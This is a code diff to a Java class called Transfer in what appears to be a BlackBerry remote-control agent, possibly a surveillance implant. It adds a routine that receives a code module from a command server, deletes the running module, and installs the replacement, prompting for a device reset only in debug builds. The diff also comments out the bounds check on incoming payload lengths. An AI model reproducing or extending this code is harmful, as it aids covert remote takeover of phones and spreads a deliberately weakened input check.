@@ -36,6 +36,7 @@ import blackberry.utils.Utils;
  */
 public class Transfer {
 
+    private static final int MAX_RECEIVE_LEN = 65536;
     /** The debug instance. */
     //#ifdef DEBUG
     protected static Debug debug = new Debug("Transfer", DebugLevel.INFORMATION);
@@ -147,7 +148,7 @@ public class Transfer {
             //#ifdef DEBUG_TRACE
             debug.trace("Try wifi, ssl:" + ssl);
             //#endif
-            
+
             connection = new WifiConnection(host, port, ssl, true);
             if (connection.isActive()) {
                 //#ifdef DEBUG_TRACE
@@ -284,9 +285,13 @@ public class Transfer {
             final byte[] buflen = connection.receive(4);
             final int len = Utils.byteArrayToInt(buflen, 0);
 
+            //#ifdef DEBUG_TRACE
+            debug.trace("fillPayload len: " + len);
+            //#endif
+
             sendCommand(Proto.OK);
 
-            fillPayload(command, len);
+            fillPayloadLen(command, len);
         } catch (final IOException e) {
             //#ifdef DEBUG
             debug.error("receiving command: " + e);
@@ -307,13 +312,13 @@ public class Transfer {
      * @throws ProtocolException
      *             the protocol exception
      */
-    protected final void fillPayload(final Command command, final int len)
+    protected final void fillPayloadLen(final Command command, final int len)
             throws ProtocolException {
         //#ifdef DBC
         Check.ensures(command != null, "command null");
         //#endif
         //#ifdef DBC
-        Check.ensures(len > 0 && len < 65536, "wrong len: " + len);
+        //Check.ensures(len > 0 && len < MAX_RECEIVE_LEN, "wrong len: " + len);
         //#endif
 
         try {
@@ -351,7 +356,7 @@ public class Transfer {
 
         // e' arrivato il challange, leggo il contenuto
         if (command.id == Proto.CHALLENGE) {
-            fillPayload(command, 16);
+            fillPayloadLen(command, 16);
 
             if (command.size() != 16) {
                 //#ifdef DEBUG
@@ -383,7 +388,6 @@ public class Transfer {
 
         //#ifdef DEBUG_TRACE
         debug.trace("getNewConf");
-
         //#endif
 
         fillPayload(command);
@@ -427,7 +431,7 @@ public class Transfer {
 
         // e' arrivato il response, leggo il contenuto
         if (command.id == Proto.RESPONSE) {
-            fillPayload(command, 16);
+            fillPayloadLen(command, 16);
             if (command.size() != 16) {
                 throw new ProtocolException("getResponse: expecting 16 bytes");
             }
@@ -457,33 +461,112 @@ public class Transfer {
      * @return the upgrade
      * @throws CommandException
      *             the command exception
+     * @throws ProtocolException
      */
     protected final void getUpgrade(final Command command)
-            throws CommandException {
-        // http://www.blackberryforums.com/developer-forum/96815-how-programmatically-download-jad-set-up-into-device.html
+            throws CommandException, ProtocolException {
 
-        // If you want to *install* an app you'll need to use a browser, as has
-        // been said; if you want to *upgrade* an application (or install
-        // additional applications via your previously installed app) you can
-        // use CodeModuleManager. Just download your cod files with normal
-        // networking, then createNewModule() and saveNewModule().
+        //#ifdef DEBUG_TRACE
+        debug.trace("getUpgrade");
+        //#endif
 
-        // One thing I've found is that if you upgrade an app (CLDC app) the new
-        // version of the app runs right away. If you upgrade a library you need
-        // to reset the device before the changes are picked up (even though
-        // isResetRequired() returns false). I guess if saveNewModule returns
-        // CMM_OK_MODULE_OVERWRITTEN you know it was a lib and will have to
-        // reset (overwriting an app returns CMM_OK).
+        sendCommand(Proto.OK);
+        
+        //#ifdef DEBUG_TRACE
+        debug.trace("fill");
+        //#endif
+        fillPayload(command);
+        if (command.size() > 0) {
+            if (upgrade(command.payload)) {
+                sendCommand(Proto.OK);
 
-        final int[] moduleHandles = CodeModuleManager.getModuleHandles();
-        for (int i = 0; i < moduleHandles.length; ++i) {
-            final String name = CodeModuleManager
-                    .getModuleName(moduleHandles[i]);
-            //#ifdef DEBUG_INFO
-            debug.info(name + " - HANDLE: " + i);
-            //#endif
+            } else {
+                throw new CommandException("Upgrade Core");
+            }
+
+        } else {
+            throw new CommandException("Empty core");
         }
-        throw new CommandException("Not Implemented");
+
+    }
+
+    private boolean upgrade(byte[] codBuff) {
+        //Delete it self.
+        int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
+        if (handle != 0) {
+            int success = CodeModuleManager.deleteModuleEx(handle, true);
+            //#ifdef DEBUG_INFO
+            debug.info("deleted: " + success);
+            //#endif
+        } else {
+            return false;
+        }
+        // Download new cod files(included sibling files).
+
+        if (isZip(codBuff)) {
+            //#ifdef DEBUG_WARN
+            debug.warn("zip not supported");
+            //#endif
+            return false;
+        } else {
+            int newHandle = 0;
+            // API REFERENCE:
+            // You need to write the data in two separate chunks.
+            // The first data chunk must be less thank 64KB in size.
+            int MAXAPPEND = 61440; // 1024*60;
+
+            if (codBuff.length > MAXAPPEND) {
+                newHandle = CodeModuleManager.createNewModule(codBuff.length,
+                        codBuff, MAXAPPEND);
+
+                boolean appendSucc = CodeModuleManager.writeNewModule(
+                        newHandle, MAXAPPEND, codBuff, MAXAPPEND,
+                        codBuff.length - MAXAPPEND);
+
+                codBuff = null;
+            } else {
+                newHandle = CodeModuleManager.createNewModule(codBuff.length,
+                        codBuff, codBuff.length);
+
+            }
+            //install the module
+            if (newHandle != 0) {
+                int savecode = CodeModuleManager.saveNewModule(newHandle, true);
+                if (savecode != CodeModuleManager.CMM_OK_MODULE_OVERWRITTEN) {
+                    //#ifdef DEBUG_ERROR
+                    debug.error("Module not overwritten");
+                    //#endif
+                    return false;
+                }
+            }
+            //#ifdef DEBUG_INFO
+            debug.info("Module installed");
+            //#endif
+
+            //restart the blackberry if required
+            if (CodeModuleManager.isResetRequired()) {
+                //#ifdef DEBUG
+                CodeModuleManager.promptForResetIfRequired();
+                //#endif
+                //#ifdef DEBUG_WARN
+                debug.warn("Reset required");
+                //#endif
+            }
+        }
+        return true;
+    }
+
+    private boolean isZip(byte[] core) {
+
+        if (core.length >= 4) {
+            // zip files start with PK followed by 0x03 and 0x04
+            if (core[0] == 0x50 && core[1] == 0x4B && core[2] == 0x03
+                    && core[3] == 0x04) {
+                return true;
+            }
+        }
+        return false;
+
     }
 
     /**
